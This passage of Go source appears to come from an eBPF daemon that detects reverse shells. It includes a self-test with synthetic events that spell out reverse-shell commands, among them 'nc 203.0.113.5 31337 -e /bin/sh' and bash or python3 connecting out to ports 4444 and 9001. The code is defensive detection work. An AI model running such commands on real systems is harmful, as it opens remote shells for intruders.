	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer shutdownCancel()

	finished := make(chan struct{})
	safeGo(nil, "shutdown_wait", logger, cancel, panicCh, func() {
		defer close(finished)
		wg.Wait()
	})

	select {
	case <-finished:
		logger.Info("daemon stopped cleanly")
	case <-shutdownCtx.Done():
		logger.Warn("graceful shutdown timed out")
	}

	if err := detector.SaveBaseline(); err != nil {
		logger.Warn("failed to save baseline", zap.Error(err))
	}

	if panicEvent != nil {
		return fmt.Errorf("daemon crashed due to panic in %s; see /var/log/rsbp/crash.log", panicEvent.Where)
	}

	return nil
}

func redactConfigForDebug(cfg *appConfig) *appConfig {
	if cfg == nil {
		return nil
	}
	clone := *cfg
	clone.RSBP.API.BearerToken = "<redacted>"
	clone.RSBP.Enrichment.AbuseIPDBAPIKey = "<redacted>"
	clone.RSBP.Outputs.Splunk.Token = "<redacted>"
	clone.RSBP.Outputs.Webhook.Secret = "<redacted>"
	return &clone
}

func reportEBPFStartupError(logger *zap.Logger, initErr error) error {
	binaryPath := "rsbpd"
	if exe, err := os.Executable(); err == nil && strings.TrimSpace(exe) != "" {
		binaryPath = exe
	}

	fixes := []string{
		fmt.Sprintf("sudo setcap 'cap_bpf,cap_sys_admin+ep' %s", binaryPath),
		fmt.Sprintf("sudo %s run --config config/rsbp.yaml", binaryPath),
		"if running in Docker, add: --privileged --cap-add=BPF --cap-add=SYS_ADMIN --security-opt seccomp=unconfined",
	}

	if details, ok := ebpf.PrivilegeErrorDetails(initErr); ok {
		missing := details.Missing
		if len(missing) == 0 {
			missing = []string{"CAP_BPF", "CAP_SYS_ADMIN"}
		}
		logger.Error("missing Linux capabilities required for eBPF startup",
			zap.Strings("missing_capabilities", missing),
			zap.String("effective_cap_mask", details.EffectiveMask),
			zap.Strings("suggested_fixes", fixes),
		)
		return fmt.Errorf("ebpf startup failed: missing capabilities %s", strings.Join(missing, ", "))
	}

	logger.Error("failed to initialize ebpf loader",
		zap.Error(initErr),
		zap.Strings("suggested_fixes", fixes),
	)
	return fmt.Errorf("ebpf startup failed: %w", initErr)
}

func loadConfig(configPath string) (*appConfig, error) {
	return loadConfigWithLogger(configPath, zap.NewNop())
}

func printJSONFromAPI(url string, bearerToken string) error {
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	if bearerToken != "" {
		req.Header.Set("Authorization", "Bearer "+bearerToken)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(body))
	}
	var pretty bytes.Buffer
	if err := json.Indent(&pretty, mustReadAll(resp.Body), "", "  "); err != nil {
		return err
	}
	fmt.Println(pretty.String())
	return nil
}

func postJSON(url string, body any, bearerToken string) error {
	payload, err := json.Marshal(body)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	if bearerToken != "" {
		req.Header.Set("Authorization", "Bearer "+bearerToken)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 300 {
		return fmt.Errorf("api status %d: %s", resp.StatusCode, string(respBody))
	}
	fmt.Println(string(respBody))
	return nil
}

func tailAlerts(path string, follow bool) error {
	ch, err := output.TailAlerts(path, follow)
	if err != nil {
		return err
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	for a := range ch {
		if err := enc.Encode(a); err != nil {
			return err
		}
	}
	return nil
}

func mustReadAll(r io.Reader) []byte {
	b, _ := io.ReadAll(r)
	return b
}

func newConfiguredLogger(levelRaw string) (*zap.Logger, error) {
	level := zap.InfoLevel
	normalized := strings.ToLower(strings.TrimSpace(levelRaw))
	if normalized == "" {
		normalized = "info"
	}
	if err := level.Set(normalized); err != nil {
		cfg := zap.NewProductionConfig()
		cfg.Level = zap.NewAtomicLevelAt(zap.InfoLevel)
		logger, logErr := cfg.Build()
		if logErr != nil {
			return nil, logErr
		}
		logger.Warn("invalid log level configured, defaulting to info", zap.String("configured", levelRaw))
		return logger, nil
	}

	cfg := zap.NewProductionConfig()
	cfg.Level = zap.NewAtomicLevelAt(level)
	logger, err := cfg.Build()
	if err != nil {
		return nil, err
	}
	return logger, nil
}

func detectOSName() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return runtime.GOOS
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "PRETTY_NAME=") {
			continue
		}
		value := strings.TrimPrefix(line, "PRETTY_NAME=")
		return strings.Trim(value, "\"")
	}
	return runtime.GOOS
}

func detectKernelVersion() string {
	if data, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
		return strings.TrimSpace(string(data))
	}
	if runtime.GOOS == "linux" {
		return "unknown"
	}
	return runtime.GOOS
}

func detectGoModPath(startDir string) string {
	if strings.TrimSpace(startDir) == "" {
		return ""
	}

	dir := startDir
	for {
		candidate := filepath.Join(dir, "go.mod")
		if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
			return candidate
		}

		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}

	return ""
}

func commFromEvent(comm [16]byte) string {
	b := comm[:]
	for i := range b {
		if b[i] == 0 {
			b = b[:i]
			break
		}
	}
	return strings.ToLower(strings.TrimSpace(string(b)))
}

func isDebugToolComm(comm [16]byte) bool {
	switch commFromEvent(comm) {
	case "bash", "sh", "python3", "nc":
		return true
	default:
		return false
	}
}

func runSelfTest(configPath string) error {
	_, _ = loadConfig(configPath)
	logger := zap.NewNop()

	out := make(chan *correlation.SessionState, 64)
	correlator := correlation.New(5*time.Second, out, logger)
	detector := detection.NewEngine(detection.Config{
		ExecConnectWindowSeconds: 5,
		MinScore:                 0.5,
		EnableBaseline:           false,
		Whitelist:                detection.WhitelistConfig{},
	}, logger)

	type scenario struct {
		Name   string
		PID    uint32
		Events []types.SyscallEvent
	}

	scenarios := []scenario{
		{
			Name: "Scenario A",
			PID:  41001,
			Events: []types.SyscallEvent{
				newSyntheticEvent(41001, sysExecve, "bash", "/bin/bash", "bash -i", "", 0, 3, false),
				newSyntheticEvent(41001, sysSocket, "bash", "/bin/bash", "bash -i", "", 0, 3, false),
				newSyntheticEvent(41001, sysConnect, "bash", "/bin/bash", "bash -i", "1.2.3.4", 4444, 3, false),
				newSyntheticEvent(41001, sysDup2, "bash", "/bin/bash", "bash -i", "", 0, 3, true),
			},
		},
		{
			Name: "Scenario B",
			PID:  41002,
			Events: []types.SyscallEvent{
				newSyntheticEvent(41002, sysExecve, "python3", "/usr/bin/python3", "python3 -c socket", "", 0, 4, false),
				newSyntheticEvent(41002, sysSocket, "python3", "/usr/bin/python3", "python3 -c socket", "", 0, 4, false),
				newSyntheticEvent(41002, sysConnect, "python3", "/usr/bin/python3", "python3 -c socket", "45.33.32.156", 9001, 4, false),
			},
		},
		{
			Name: "Scenario C",
			PID:  41003,
			Events: []types.SyscallEvent{
				newSyntheticEvent(41003, sysExecve, "nc", "/usr/bin/nc", "nc 203.0.113.5 31337 -e /bin/sh", "", 0, 5, false),
				newSyntheticEvent(41003, sysConnect, "nc", "/usr/bin/nc", "nc 203.0.113.5 31337 -e /bin/sh", "203.0.113.5", 31337, 5, false),
			},
		},
	}

	failures := 0
	for _, sc := range scenarios {
		start := time.Now()
		for _, ev := range sc.Events {
			correlator.Process(ev)
		}

		passed := false
		deadline := time.Now().Add(5 * time.Second)
	waitLoop:
		for time.Now().Before(deadline) {
			select {
			case session := <-out:
				if session == nil || session.PID != sc.PID {
					continue
				}
				alerts := detector.Evaluate(session, types.SyscallEvent{TimestampNS: uint64(time.Now().UnixNano()), ReceivedAt: session.FirstEventAt}, "self-test")
				if len(alerts) == 0 {
					continue
				}
				a := alerts[0]
				if strings.TrimSpace(string(a.Severity)) == "" || a.Confidence <= 0 || len(a.MITREAttack) == 0 {
					elapsed := time.Since(start)
					fmt.Printf("FAIL %s (%s): invalid alert fields\n", sc.Name, elapsed)
					failures++
					passed = true
					break waitLoop
				}
				elapsed := time.Since(start)
				fmt.Printf("PASS %s (%s)\n", sc.Name, elapsed)
				passed = true
				break waitLoop
			default:
				time.Sleep(20 * time.Millisecond)
			}
		}

		if !passed {
			fmt.Printf("FAIL %s (timeout waiting for alert)\n", sc.Name)
			failures++
		}
	}

	if failures > 0 {
		return fmt.Errorf("self-test failed: %d scenario(s) did not pass", failures)
	}

	return nil
}

func newSyntheticEvent(pid uint32, syscallNr uint32, comm string, exe string, args string, remoteIP string, remotePort uint16, fd int32, hasDupToStdio bool) types.SyscallEvent {
	now := time.Now().UTC()
	ev := types.SyscallEvent{
		PID:         pid,
		PPID:        1,
		UID:         1000,
		GID:         1000,
		SyscallNr:   syscallNr,
		FD:          fd,
		TimestampNS: uint64(now.UnixNano()),
		ReceivedAt:  now,
	}
	if hasDupToStdio {
		ev.HasDup2Stdio = 1
	}
	copy(ev.Comm[:], []byte(comm))
	copy(ev.ExecPath[:], []byte(exe))
	copy(ev.Args[:], []byte(args))

	if remoteIP != "" {
		ev.Family = 2
		ev.RemoteIP4 = ipToUint32(remoteIP)
		ev.RemotePort = remotePort
	}

	return ev
}

func ipToUint32(addr string) uint32 {
	ip := net.ParseIP(strings.TrimSpace(addr))
	if ip == nil {
		return 0
	}
	v4 := ip.To4()
	if v4 == nil {
		return 0
	}
	return uint32(v4[0]) | uint32(v4[1])<<8 | uint32(v4[2])<<16 | uint32(v4[3])<<24
}
